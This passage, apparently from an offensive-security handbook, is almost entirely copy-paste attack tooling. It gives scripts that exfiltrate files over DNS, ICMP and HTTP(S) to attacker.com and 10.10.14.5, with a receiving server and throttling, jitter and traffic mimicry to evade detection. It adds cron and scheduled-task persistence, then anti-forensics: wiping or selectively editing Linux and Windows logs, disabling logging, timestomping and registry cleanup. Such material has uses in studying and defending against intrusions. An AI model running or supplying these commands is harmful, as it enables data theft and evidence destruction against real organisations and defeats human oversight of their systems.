base64 -w0 "$FILE" | fold -w32 | nl | while read num data; do
    # Format: sequence.data.filename.domain
    query="${num}.${data}.$(basename $FILE | tr -d '.').${DOMAIN}"
    dig +short @${DNS_SERVER} ${query} > /dev/null 2>&1
    sleep 2  # Rate limiting
done
```

**Receiving DNS queries (attacker side):**

```bash
# Using tcpdump
tcpdump -i eth0 -n 'udp port 53' -A | grep attacker.com

# Using dnsmasq logging
dnsmasq --log-queries --log-facility=/tmp/dns.log

# Parse exfiltrated data
grep "attacker.com" /var/log/dnsmasq.log | cut -d' ' -f6 | cut -d'.' -f2 | sort | xxd -r -p
```

**DNS TXT record exfiltration:**

```bash
# Exfiltrate via TXT records (requires DNS server control)
# Target machine
echo "SELECT * FROM users" | base64 | xxd -p | tr -d '\n' > /tmp/query.txt

# Request TXT record with data as subdomain
dig TXT $(cat /tmp/query.txt).exfil.attacker.com
```

#### ICMP Exfiltration

**Basic ICMP tunneling:**

```bash
# Using ptunnel (requires ptunnel on both ends)
# Attacker machine (listener)
ptunnel -x SecretPassword

# Target machine
ptunnel -p 10.10.14.5 -lp 8000 -da 127.0.0.1 -dp 22 -x SecretPassword
ssh -p 8000 localhost
```

**Manual ICMP exfiltration:**

```bash
# Encode data in ICMP payload
cat sensitive.txt | xxd -p | tr -d '\n' | fold -w32 | while read line; do
    ping -c 1 -p $line 10.10.14.5
    sleep 1
done

# Alternative: using hping3
cat sensitive.txt | while read line; do
    echo "$line" | hping3 10.10.14.5 --icmp --data 100 --sign $(echo -n "$line" | xxd -p)
    sleep 2
done
```

**Capture ICMP exfiltration (attacker side):**

```bash
# Using tcpdump
tcpdump -i eth0 -n 'icmp' -X | tee icmp_capture.txt

# Extract payloads
tcpdump -i eth0 -n 'icmp' -X | grep -oE '0x[0-9a-f]+' | cut -d'x' -f2 | xxd -r -p

# Using Scapy
python3 << EOF
from scapy.all import *
def process_packet(packet):
    if ICMP in packet:
        payload = bytes(packet[ICMP].payload)
        print(payload.hex())
sniff(filter="icmp", prn=process_packet)
EOF
```

#### HTTP(S) Stealth Exfiltration

**Slow HTTP POST exfiltration:**

```bash
# Split and send via POST requests
split -b 10K sensitive.tar.gz.enc chunk_

for chunk in chunk_*; do
    curl -X POST -H "Content-Type: application/octet-stream" \
         --data-binary @$chunk \
         http://10.10.14.5:8080/upload?file=$chunk
    sleep 30  # Delay between requests
    rm $chunk
done
```

**Exfiltrate via HTTP headers:**

```bash
# Encode data in headers
cat sensitive.txt | base64 | while read line; do
    curl -H "X-Custom-Data: $line" http://10.10.14.5:8080/
    sleep 5
done

# Using cookies
cat data.txt | xxd -p | tr -d '\n' | fold -w50 | while read line; do
    curl -b "session=$line" http://10.10.14.5:8080/
    sleep 3
done
```

**HTTPS with valid certificates (blend with legitimate traffic):**

```bash
# Use legitimate-looking endpoints
curl -X POST -H "Content-Type: application/json" \
     -d "{\"update\": \"$(cat data.txt | base64)\"}" \
     https://attacker.com/api/v1/telemetry

# Mimic software update checks
curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) UpdateChecker/1.0" \
     --data-binary @data.enc \
     https://attacker.com/updates/check
```

**Web server for receiving exfiltrated data:**

```python
#!/usr/bin/env python3
# Simple receiver with logging
from http.server import HTTPServer, BaseHTTPRequestHandler
import base64
from datetime import datetime

class ExfilHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"exfil_{timestamp}.dat"
        
        with open(filename, 'wb') as f:
            f.write(post_data)
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 8080), ExfilHandler)
    print("[*] Listening on port 8080")
    server.serve_forever()
```

### Data Encoding for Transit

#### Base64 Encoding

**Basic base64 usage:**

```bash
# Encode file
base64 sensitive.tar.gz > sensitive.b64
base64 -w 0 sensitive.tar.gz > sensitive_nowrap.b64  # No line wraps

# Decode
base64 -d sensitive.b64 > sensitive.tar.gz

# Encode and exfiltrate in one command
cat sensitive.txt | base64 | curl -d @- http://10.10.14.5:8080/
```

**Windows base64:**

```powershell
# PowerShell encoding
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\sensitive.txt")) | Out-File C:\encoded.txt

# Decoding
[IO.File]::WriteAllBytes("C:\decoded.txt", [Convert]::FromBase64String((Get-Content C:\encoded.txt)))

# CertUtil (native Windows tool)
certutil -encode sensitive.zip encoded.b64
certutil -decode encoded.b64 sensitive.zip
```

#### Hexadecimal Encoding

**Hex encoding:**

```bash
# Convert to hex
xxd -p sensitive.txt > sensitive.hex
od -An -tx1 sensitive.txt | tr -d ' \n' > sensitive.hex

# Decode hex
xxd -r -p sensitive.hex > sensitive.txt

# Hex dump for network protocols
cat sensitive.txt | xxd -p | tr -d '\n'
```

#### URL Encoding

**URL encoding for web exfiltration:**

```bash
# URL encode data
python3 -c "import urllib.parse; print(urllib.parse.quote(open('data.txt').read()))"

# Exfiltrate via GET parameters
curl "http://10.10.14.5:8080/?data=$(python3 -c 'import urllib.parse; print(urllib.parse.quote(open(\"sensitive.txt\").read()))')"
```

#### Custom Encoding Schemes

**XOR encoding:**

```python
#!/usr/bin/env python3
# XOR encoder/decoder
def xor_encode(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

# Encode
with open('sensitive.txt', 'rb') as f:
    data = f.read()
key = b'SecretKey123'
encoded = xor_encode(data, key)

with open('encoded.bin', 'wb') as f:
    f.write(encoded)

# Decode (same function)
with open('encoded.bin', 'rb') as f:
    encoded = f.read()
decoded = xor_encode(encoded, key)
```

**ROT13/Caesar cipher (simple obfuscation):**

```bash
# ROT13 encoding (text only)
echo "sensitive data" | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# Caesar cipher with shift
echo "sensitive" | tr 'a-z' 'd-za-c'  # Shift by 3
```

### Splitting Large Files

#### Split Command (Linux)

**Size-based splitting:**

```bash
# Split into 100MB chunks
split -b 100M largefile.tar.gz chunk_

# Split with custom suffix length
split -b 50M -d -a 4 largefile.tar.gz part_  # part_0000, part_0001, etc.

# Split into specific number of parts
split -n 10 largefile.tar.gz chunk_  # Split into 10 equal parts

# Combine chunks
cat chunk_* > reconstructed.tar.gz
```

**Line-based splitting (text files):**

```bash
# Split by line count
split -l 10000 logfile.txt log_part_

# Split by pattern
csplit largefile.log '/^===/' '{*}'  # Split on pattern match
```

**Verify integrity after reconstruction:**

```bash
# Create checksum before splitting
md5sum largefile.tar.gz > checksum.txt

# After reconstruction
md5sum reconstructed.tar.gz
diff checksum.txt <(md5sum reconstructed.tar.gz)
```

#### Windows File Splitting

**PowerShell splitting:**

```powershell
# Split file into chunks
$inputFile = "C:\largefile.zip"
$chunkSize = 100MB
$buffer = New-Object byte[] $chunkSize
$fileStream = [IO.File]::OpenRead($inputFile)
$chunkIndex = 0

while ($bytesRead = $fileStream.Read($buffer, 0, $chunkSize)) {
    $outputFile = "$inputFile.part$chunkIndex"
    [IO.File]::WriteAllBytes($outputFile, $buffer[0..($bytesRead-1)])
    $chunkIndex++
}
$fileStream.Close()
```

**Reconstruction script:**

```powershell
# Combine parts
$outputFile = "C:\reconstructed.zip"
$parts = Get-ChildItem "C:\largefile.zip.part*" | Sort-Object Name
$outputStream = [IO.File]::Create($outputFile)

foreach ($part in $parts) {
    $bytes = [IO.File]::ReadAllBytes($part.FullName)
    $outputStream.Write($bytes, 0, $bytes.Length)
}
$outputStream.Close()
```

**Using native Windows tools:**

```cmd
# FSUtil (requires admin privileges)
fsutil file createnew part1.dat 104857600  # 100MB

# Copy with byte ranges (not native split, requires scripting)
```

#### Split with Encryption

**Encrypt then split:**

```bash
# Encrypt first
openssl enc -aes-256-cbc -salt -in largefile.tar.gz -out encrypted.bin -k 'Password123'

# Split encrypted file
split -b 50M encrypted.bin encrypted_part_

# Exfiltrate parts separately
for part in encrypted_part_*; do
    curl -X POST --data-binary @$part http://10.10.14.5:8080/upload?file=$part
    sleep 60
done
```

**Reconstruct and decrypt:**

```bash
# Combine parts
cat encrypted_part_* > encrypted_combined.bin

# Decrypt
openssl enc -d -aes-256-cbc -in encrypted_combined.bin -out largefile.tar.gz -k 'Password123'
```

### Timing Awareness

#### Traffic Pattern Analysis

**Understand baseline network activity:**

```bash
# Monitor network connections
netstat -tunap | grep ESTABLISHED
ss -tunap | grep ESTAB

# Check scheduled tasks that might trigger network monitoring
crontab -l
systemctl list-timers

# Identify peak/off-hours usage
# Review logs for activity patterns
last | awk '{print $7}' | sort | uniq -c
```

#### Rate Limiting Strategies

**Throttled exfiltration:**

```bash
#!/bin/bash
# Intelligent throttling script
EXFIL_FILE="$1"
DEST_URL="http://10.10.14.5:8080/upload"
CHUNK_SIZE="10K"  # Small chunks
MIN_DELAY=30      # Minimum seconds between chunks
MAX_DELAY=300     # Maximum seconds between chunks

split -b $CHUNK_SIZE "$EXFIL_FILE" chunk_

for chunk in chunk_*; do
    # Random delay to avoid pattern detection
    delay=$((MIN_DELAY + RANDOM % (MAX_DELAY - MIN_DELAY)))
    
    # Only exfil during business hours (blend with traffic)
    hour=$(date +%H)
    if [ $hour -ge 9 ] && [ $hour -le 17 ]; then
        curl -X POST --data-binary @$chunk "$DEST_URL?file=$chunk" 2>/dev/null
        rm $chunk
    fi
    
    sleep $delay
done
```

**Bandwidth throttling:**

```bash
# Using trickle to limit bandwidth
trickle -s -d 50 -u 20 curl -X POST --data-binary @data.tar.gz http://10.10.14.5:8080/

# Using pv (pipe viewer) for rate limiting
pv -L 10k data.tar.gz | curl -X POST --data-binary @- http://10.10.14.5:8080/

# rsync with bandwidth limit
rsync --bwlimit=50 data.tar.gz user@10.10.14.5:/tmp/
```

#### Time-based Exfiltration

**Schedule exfiltration during specific windows:**

```bash
#!/bin/bash
# Only exfiltrate during off-hours
EXFIL_FILE="$1"
DEST="10.10.14.5:8080"

# Wait until off-hours (e.g., 2 AM - 5 AM)
while true; do
    hour=$(date +%H)
    if [ $hour -ge 2 ] && [ $hour -lt 5 ]; then
        # Exfiltrate with random delays
        curl -X POST --data-binary @$EXFIL_FILE http://$DEST/upload
        break
    fi
    sleep 600  # Check every 10 minutes
done
```

**Cron-based scheduled exfiltration:**

```bash
# Add to crontab for 3 AM exfiltration
echo "0 3 * * * /tmp/.exfil_script.sh /tmp/sensitive.tar.gz.enc" | crontab -

# Windows scheduled task (3 AM daily)
schtasks /create /tn "SystemUpdate" /tr "powershell.exe -File C:\temp\exfil.ps1" /sc daily /st 03:00 /ru SYSTEM
```

#### Mimicking Legitimate Traffic

**User-Agent rotation:**

```bash
# Array of common user agents
USER_AGENTS=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
)

# Rotate user agents
for chunk in chunk_*; do
    UA=${USER_AGENTS[$RANDOM % ${#USER_AGENTS[@]}]}
    curl -A "$UA" -X POST --data-binary @$chunk http://10.10.14.5:8080/
    sleep $((60 + RANDOM % 180))
done
```

**Protocol mimicry:**

```bash
# Mimic HTTPS certificate checks
curl --cacert /etc/ssl/certs/ca-certificates.crt \
     -H "Content-Type: application/octet-stream" \
     -H "X-API-Key: $(uuidgen)" \
     --data-binary @data.enc \
     https://attacker.com/api/v2/metrics

# Mimic cloud storage sync
curl -X PUT \
     -H "x-amz-storage-class: STANDARD" \
     -H "Content-Type: application/gzip" \
     --data-binary @backup.tar.gz.enc \
     https://attacker.com/backup/$(date +%Y%m%d).tar.gz
```

#### Detection Evasion Timing

**Avoid triggering volume-based alerts:**

```bash
#!/bin/bash
# Stay under data transfer threshold (e.g., 500MB/day)
DAILY_LIMIT=$((500 * 1024 * 1024))  # 500MB in bytes
TRANSFERRED=0
THRESHOLD=$((DAILY_LIMIT * 80 / 100))  # 80% of limit

for chunk in chunk_*; do
    SIZE=$(stat -f%z "$chunk" 2>/dev/null || stat -c%s "$chunk")
    
    if [ $((TRANSFERRED + SIZE)) -gt $THRESHOLD ]; then
        # Wait until next day
        sleep $(( (24 - $(date +%H)) * 3600 ))
        TRANSFERRED=0
    fi
    
    curl -X POST --data-binary @$chunk http://10.10.14.5:8080/
    TRANSFERRED=$((TRANSFERRED + SIZE))
    sleep $((120 + RANDOM % 180))
done
```

**Jitter implementation (randomized timing):**

```python
#!/usr/bin/env python3
import time
import random
import requests

def exfiltrate_with_jitter(file_path, base_delay=60, jitter=0.3):
    """
    Exfiltrate with randomized timing (jitter)
    base_delay: base wait time in seconds
    jitter: percentage variance (0.0-1.0)
    """
    with open(file_path, 'rb') as f:
        data = f.read()
    
    # Add random jitter to delay
    variance = base_delay * jitter
    actual_delay = base_delay + random.uniform(-variance, variance)
    
    time.sleep(actual_delay)
    
    response = requests.post('http://10.10.14.5:8080/upload', data=data)
    return response.status_code

# Usage
for i in range(10):
    exfiltrate_with_jitter(f'chunk_{i}', base_delay=120, jitter=0.4)
```

#### Log Awareness

**Monitor for detection during exfiltration:**

```bash
# Check if logs are being monitored
ps aux | grep -E "syslog|auditd|splunk|ossec"

# Identify logging daemons
systemctl list-units | grep -E "log|audit"

# Check log retention policies
cat /etc/logrotate.conf
ls -lah /var/log/

# Clear tracks (use cautiously - may trigger alerts)
# Selective clearing better than complete deletion
history -c
echo "" > ~/.bash_history
```

**Windows event log awareness:**

```powershell
# Check if logging services are running
Get-Service | Where-Object {$_.Name -like "*log*" -or $_.Name -like "*audit*"}

# Check event log configuration
Get-EventLog -List
wevtutil el

# Monitor for security events during exfil
Get-WinEvent -LogName Security -MaxEvents 100 | Where-Object {$_.TimeCreated -gt (Get-Date).AddMinutes(-5)}
```

---

**Related Critical Topics:**

- **Network protocol analysis and evasion** - deep understanding of packet inspection and bypass techniques
- **Anti-forensics and log manipulation** - covering tracks during and after exfiltration
- **Covert channels and steganography** - hiding data within legitimate files and protocols

---

## Covering Tracks

### Log Deletion (Windows Event Logs, syslog)

Log deletion is critical for avoiding detection after exploitation. Different operating systems store logs in different locations with varying protection mechanisms.

#### Linux Log Deletion

**Primary Log Locations**

```bash
# Common Linux log directories
/var/log/syslog          # Debian/Ubuntu system logs
/var/log/messages        # RHEL/CentOS system logs
/var/log/auth.log        # Debian/Ubuntu authentication logs
/var/log/secure          # RHEL/CentOS authentication logs
/var/log/kern.log        # Kernel logs
/var/log/boot.log        # Boot process logs
/var/log/dmesg           # Kernel ring buffer
/var/log/apache2/        # Apache web server logs
/var/log/nginx/          # Nginx web server logs
/var/log/mysql/          # MySQL database logs
```

**Technique: Complete Log Deletion**

```bash
# Delete all logs in /var/log (aggressive, easily detected)
rm -rf /var/log/*

# Delete specific log files
rm -f /var/log/auth.log
rm -f /var/log/syslog
rm -f /var/log/messages

# Truncate logs instead of deleting (less obvious)
truncate -s 0 /var/log/auth.log
truncate -s 0 /var/log/syslog

# Alternative truncation method
> /var/log/auth.log
echo "" > /var/log/syslog

# Clear all logs while preserving files
for log in /var/log/*.log; do > "$log"; done

# Find and clear all log files recursively
find /var/log -type f -name "*.log" -exec truncate -s 0 {} \;
```

**Technique: Systemd Journal Deletion**

```bash
# Check journal size
journalctl --disk-usage

# Delete journal logs older than specified time
journalctl --vacuum-time=1s

# Delete journal logs by size
journalctl --vacuum-size=1M

# Rotate and delete
journalctl --rotate
journalctl --vacuum-time=1s

# Clear all journal logs
rm -rf /var/log/journal/*
rm -rf /run/log/journal/*

# Stop journal service temporarily
systemctl stop systemd-journald
rm -rf /var/log/journal/*
systemctl start systemd-journald
```

**Technique: Rsyslog Manipulation**

```bash
# Stop rsyslog service
systemctl stop rsyslog

# Clear logs
> /var/log/syslog
> /var/log/auth.log

# Restart service
systemctl start rsyslog

# Permanently disable logging (for persistence)
systemctl disable rsyslog
systemctl mask rsyslog

# Modify rsyslog configuration to discard logs
echo '*.* ~' > /etc/rsyslog.d/99-discard.conf
systemctl restart rsyslog
```

#### Windows Event Log Deletion

**Event Log Locations**

Windows Event Logs are stored in binary format:

- `C:\Windows\System32\winevt\Logs\`
- Security.evtx (security events, logon/logoff)
- System.evtx (system events)
- Application.evtx (application events)

**Technique: PowerShell Event Log Clearing**

```powershell
# Clear specific event log
Clear-EventLog -LogName Security
Clear-EventLog -LogName System
Clear-EventLog -LogName Application

# Clear all event logs
wevtutil el | Foreach-Object {wevtutil cl "$_"}

# Alternative method
Get-EventLog -LogName * | ForEach-Object { Clear-EventLog $_.Log }

# Clear specific log using wevtutil
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Query log before clearing
wevtutil qe Security /c:10 /rd:true /f:text

# Export before clearing (for selective deletion)
wevtutil epl Security C:\temp\security_backup.evtx
```

**Technique: Command Prompt Event Log Clearing**

```cmd
REM Clear Security log (requires admin)
wevtutil cl Security

REM Clear System log
wevtutil cl System

REM Clear Application log
wevtutil cl Application

REM Clear PowerShell logs
wevtutil cl "Windows PowerShell"
wevtutil cl "Microsoft-Windows-PowerShell/Operational"

REM Clear Remote Desktop logs
wevtutil cl "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational"

REM Clear Windows Defender logs
wevtutil cl "Microsoft-Windows-Windows Defender/Operational"
```

**Technique: Direct File Manipulation**

```powershell
# Stop Event Log service
Stop-Service -Name EventLog -Force

# Delete event log files
Remove-Item C:\Windows\System32\winevt\Logs\Security.evtx
Remove-Item C:\Windows\System32\winevt\Logs\System.evtx
Remove-Item C:\Windows\System32\winevt\Logs\Application.evtx

# Start Event Log service
Start-Service -Name EventLog

# Alternative: Use takeown and icacls for permission issues
takeown /f C:\Windows\System32\winevt\Logs\Security.evtx
icacls C:\Windows\System32\winevt\Logs\Security.evtx /grant Administrators:F
Remove-Item C:\Windows\System32\winevt\Logs\Security.evtx
```

**Technique: Disable Event Logging**

```powershell
# Disable event log service
Set-Service -Name EventLog -StartupType Disabled
Stop-Service -Name EventLog -Force

# Using registry to disable specific logs
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\EventLog\Security" -Name "Start" -Value 4 -PropertyType DWORD -Force

# Disable PowerShell logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscripting" -Value 0
```

### Log Manipulation

Log manipulation is more subtle than deletion and can avoid detection by maintaining log file integrity while removing incriminating entries.

#### Linux Log Manipulation

**Technique: Selective Line Deletion with sed**

```bash
# Remove lines containing specific IP address
sed -i '/192.168.1.100/d' /var/log/auth.log

# Remove lines containing username
sed -i '/attacker_username/d' /var/log/auth.log

# Remove lines within time range
sed -i '/Oct 12 14:00/,/Oct 12 15:00/d' /var/log/syslog

# Remove failed login attempts for specific user
sed -i '/Failed password for attacker/d' /var/log/auth.log

# Remove SSH connections from specific IP
sed -i '/sshd.*192.168.1.100/d' /var/log/auth.log

# Backup before manipulation (for testing)
cp /var/log/auth.log /tmp/auth.log.bak
sed -i '/attacker/d' /var/log/auth.log
```

**Technique: Log Manipulation with grep -v**

```bash
# Filter out unwanted entries and overwrite
grep -v "192.168.1.100" /var/log/auth.log > /tmp/cleaned.log
cat /tmp/cleaned.log > /var/log/auth.log
rm /tmp/cleaned.log

# Remove multiple patterns
grep -v -e "attacker" -e "malicious" -e "192.168.1.100" /var/log/auth.log > /tmp/cleaned.log
mv /tmp/cleaned.log /var/log/auth.log

# Chain multiple filters
cat /var/log/auth.log | grep -v "Failed password" | grep -v "invalid user" > /tmp/cleaned.log
cat /tmp/cleaned.log > /var/log/auth.log
```

**Technique: Awk-Based Log Manipulation**

```bash
# Remove entries from specific time range
awk '!/Oct 12 14:/ && !/Oct 12 15:/' /var/log/syslog > /tmp/syslog.clean
cat /tmp/syslog.clean > /var/log/syslog

# Remove entries matching multiple criteria
awk '!/192.168.1.100/ && !/attacker/' /var/log/auth.log > /tmp/auth.clean
cat /tmp/auth.clean > /var/log/auth.log

# Complex filtering with conditions
awk '{if ($0 !~ /Failed password/ && $0 !~ /invalid user/) print}' /var/log/auth.log > /tmp/clean.log
cat /tmp/clean.log > /var/log/auth.log
```

**Technique: Real-Time Log Tampering**

```bash
# Monitor and filter logs in real-time using tail and grep
# Create a script that removes entries as they're written

cat > /usr/local/bin/log_filter.sh << 'EOF'
#!/bin/bash
tail -F /var/log/auth.log | while read line; do
    if ! echo "$line" | grep -q "192.168.1.100"; then
        echo "$line" >> /var/log/auth.log.filtered
    fi
done
EOF

chmod +x /usr/local/bin/log_filter.sh

# Redirect rsyslog to filtered script
# Modify /etc/rsyslog.conf to pipe through filter
```

**Technique: Logrotate Exploitation**

```bash
# Force log rotation to move evidence to rotated file
logrotate -f /etc/logrotate.conf

# Delete rotated logs
rm -f /var/log/auth.log.1
rm -f /var/log/syslog.*.gz

# Modify logrotate config for rapid rotation
cat >> /etc/logrotate.d/custom << 'EOF'
/var/log/auth.log {
    size 1k
    rotate 0
    missingok
}
EOF

# Force rotation
logrotate -f /etc/logrotate.d/custom
```

#### Windows Event Log Manipulation

**Technique: PowerShell Selective Event Deletion**

[Inference] This approach removes specific events while maintaining the log structure, making detection more difficult than wholesale deletion:

```powershell
# Get specific events to remove
$events = Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} -MaxEvents 100

# Filter events by criteria (e.g., specific username or IP)
$eventsToRemove = $events | Where-Object {$_.Message -like "*attacker*"}

# Note: Direct event deletion requires low-level manipulation
# PowerShell doesn't provide built-in selective deletion

# Alternative: Export, filter, clear, and reimport (complex)
# Export all events
wevtutil epl Security C:\temp\security.evtx

# Clear log
wevtutil cl Security

# Parse and selectively reimport using custom tools
```

**Technique: WevtUtil Query and Export Filtering**

```cmd
REM Query specific events
wevtutil qe Security "/q:*[System[(EventID=4624)]]" /f:text

REM Export filtered events (excluding unwanted)
wevtutil qe Security "/q:*[System[(EventID!=4624)]]" /f:text > filtered.txt

REM Clear and reimport strategy (requires custom parsing)
```

**Technique: Direct EVTX File Manipulation**

[Unverified] This requires understanding the EVTX binary format specification:

```powershell
# Stop Event Log service
Stop-Service -Name EventLog -Force

# Copy EVTX file for manipulation
Copy-Item C:\Windows\System32\winevt\Logs\Security.evtx C:\temp\Security.evtx

# Use third-party tools like EvtxECmd or python-evtx for parsing
# Manual hex editing possible but complex due to binary format

# After manipulation, replace original
Move-Item C:\temp\Security_modified.evtx C:\Windows\System32\winevt\Logs\Security.evtx -Force

# Start Event Log service
Start-Service -Name EventLog
```

**Technique: Phantom DLL Hijacking for Log Filtering**

[Inference] This advanced technique involves injecting code into the Event Log service to filter events before they're written:

```powershell
# Create DLL that hooks EventLog API
# Place in appropriate location for DLL hijacking
# Restart EventLog service

# This is advanced and requires significant development
```

### File Timestamp Manipulation

File timestamps (MAC times: Modified, Accessed, Created) can reveal attacker activity. Manipulating them is crucial for anti-forensics.

#### Linux Timestamp Manipulation

**Understanding Linux Timestamps**

```bash
# View file timestamps
stat filename

# Output shows:
# Access time (atime): Last access
# Modify time (mtime): Last content modification  
# Change time (ctime): Last metadata change (cannot be manually changed)

ls -la filename        # Shows mtime
ls -lu filename        # Shows atime
ls -lc filename        # Shows ctime
```

**Technique: Touch Command Manipulation**

```bash
# Change modification and access time to current time
touch filename

# Set specific date and time
touch -t 202501011200.00 filename
# Format: YYYYMMDDhhmm.ss

# Set modification time to specific datetime
touch -m -t 202501011200.00 filename

# Set access time to specific datetime
touch -a -t 202501011200.00 filename

# Copy timestamps from another file
touch -r reference_file target_file

# Set time to 30 days ago
touch -d "30 days ago" filename

# Set specific date in human-readable format
touch -d "2025-01-01 12:00:00" filename
```

**Technique: Advanced Timestamp Manipulation with debugfs**

[Inference] debugfs allows direct filesystem manipulation, including modification of all timestamps including ctime:

```bash
# For ext2/ext3/ext4 filesystems
# Find inode number
ls -i filename
# Output: 12345678 filename

# Launch debugfs
debugfs -w /dev/sda1

# Within debugfs, set timestamps
set_inode_field <inode_number> atime 202501011200
set_inode_field <inode_number> mtime 202501011200
set_inode_field <inode_number> ctime 202501011200

# Alternative debugfs one-liner
debugfs -w -R 'set_inode_field <12345678> mtime 202501011200' /dev/sda1
debugfs -w -R 'set_inode_field <12345678> ctime 202501011200' /dev/sda1
debugfs -w -R 'set_inode_field <12345678> atime 202501011200' /dev/sda1
```

**Technique: Timestomp Alternative for Linux**

```bash
# Using Python script for precise timestamp manipulation
cat > timestomp.py << 'EOF'
#!/usr/bin/env python3
import os
import sys
from datetime import datetime

def set_timestamp(filepath, date_string):
    # Parse date string: "YYYY-MM-DD HH:MM:SS"
    dt = datetime.strptime(date_string, "%Y-%m-%d %H:%M:%S")
    timestamp = dt.timestamp()
    
    # Set atime and mtime
    os.utime(filepath, (timestamp, timestamp))
    print(f"Timestamps set for {filepath}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: timestomp.py <file> <datetime>")
        print("Example: timestomp.py file.txt '2025-01-01 12:00:00'")
        sys.exit(1)
    
    set_timestamp(sys.argv[1], sys.argv[2])
EOF

chmod +x timestomp.py
./timestomp.py malicious.sh "2024-06-15 10:30:00"
```

**Technique: Batch Timestamp Matching**

```bash
# Match timestamps of multiple files to a reference
reference_file="/bin/ls"
target_directory="/root/malicious_tools/"

# Get reference timestamps
ref_time=$(stat -c %Y "$reference_file")

# Apply to all files in directory
find "$target_directory" -type f -exec touch -d @"$ref_time" {} \;

# Alternative with touch -r
find "$target_directory" -type f -exec touch -r "$reference_file" {} \;
```

#### Windows Timestamp Manipulation

**Understanding Windows Timestamps**

Windows tracks:

- Creation Time
- Last Modified Time
- Last Access Time
- Entry Modified Time (MFT entry)

**Technique: PowerShell Timestamp Manipulation**

```powershell
# View file timestamps
Get-Item file.exe | Select-Object CreationTime, LastWriteTime, LastAccessTime

# Set creation time
(Get-Item file.exe).CreationTime = '01/01/2025 12:00:00'

# Set last write time (modification)
(Get-Item file.exe).LastWriteTime = '01/01/2025 12:00:00'

# Set last access time
(Get-Item file.exe).LastAccessTime = '01/01/2025 12:00:00'

# Set all timestamps at once
$date = Get-Date '01/01/2025 12:00:00'
$file = Get-Item file.exe
$file.CreationTime = $date
$file.LastWriteTime = $date
$file.LastAccessTime = $date

# Copy timestamps from another file
$ref = Get-Item C:\Windows\System32\cmd.exe
$target = Get-Item C:\malicious\backdoor.exe
$target.CreationTime = $ref.CreationTime
$target.LastWriteTime = $ref.LastWriteTime
$target.LastAccessTime = $ref.LastAccessTime
```

**Technique: Timestomp (Metasploit)**

```bash
# In Meterpreter session
meterpreter > timestomp -h

# View current timestamps
meterpreter > timestomp C:\\temp\\backdoor.exe -v

# Set specific timestamps
# Format: MM/DD/YYYY HH:MM:SS
meterpreter > timestomp C:\\temp\\backdoor.exe -m "01/01/2025 12:00:00"
meterpreter > timestomp C:\\temp\\backdoor.exe -a "01/01/2025 12:00:00"
meterpreter > timestomp C:\\temp\\backdoor.exe -c "01/01/2025 12:00:00"
meterpreter > timestomp C:\\temp\\backdoor.exe -e "01/01/2025 12:00:00"

# Copy timestamps from another file
meterpreter > timestomp C:\\temp\\backdoor.exe -r C:\\Windows\\System32\\cmd.exe

# Blank all timestamps
meterpreter > timestomp C:\\temp\\backdoor.exe -b
```

**Technique: SetMace Tool**

SetMace is a standalone timestamp manipulation tool:

```cmd
REM Download SetMace from appropriate source
REM Usage: SetMace.exe <file> <datetime>

SetMace.exe backdoor.exe "01/01/2025 12:00:00"

REM Set all MAC times
SetMace.exe -m "01/01/2025 12:00:00" backdoor.exe
SetMace.exe -a "01/01/2025 12:00:00" backdoor.exe
SetMace.exe -c "01/01/2025 12:00:00" backdoor.exe
```

**Technique: NewFileTime Tool**

```cmd
REM NewFileTime GUI tool or command line

REM Command line usage
NewFileTime.exe /file:"C:\backdoor.exe" /created:"2025-01-01 12:00:00" /modified:"2025-01-01 12:00:00" /accessed:"2025-01-01 12:00:00"
```

**Technique: NTFS Timestamp Manipulation via WinAPI**

```powershell
# PowerShell using .NET Framework
Add-Type @"
using System;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;
using System.IO;

public class TimestampManipulator {
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern SafeFileHandle CreateFile(
        string lpFileName, uint dwDesiredAccess, uint dwShareMode,
        IntPtr lpSecurityAttributes, uint dwCreationDisposition,
        uint dwFlagsAndAttributes, IntPtr hTemplateFile);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool SetFileTime(
        SafeFileHandle hFile,
        ref long lpCreationTime,
        ref long lpLastAccessTime,
        ref long lpLastWriteTime);

    public static void SetTimestamps(string file, DateTime dt) {
        SafeFileHandle handle = CreateFile(file, 0x40000000, 0, IntPtr.Zero, 3, 0, IntPtr.Zero);
        long time = dt.ToFileTime();
        SetFileTime(handle, ref time, ref time, ref time);
        handle.Close();
    }
}
"@

# Use the class
$date = Get-Date '01/01/2025 12:00:00'
[TimestampManipulator]::SetTimestamps("C:\backdoor.exe", $date)
```

### Registry Cleanup (Windows)

The Windows Registry stores extensive forensic artifacts. Cleaning specific keys is essential for covering tracks.

#### Key Registry Locations for Forensics

**Recently Accessed Files**

```powershell
# Recent documents
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs

# Typed URLs
HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\TypedURLs

# User Assist (tracks program execution)
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist

# Recent Run Commands
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU

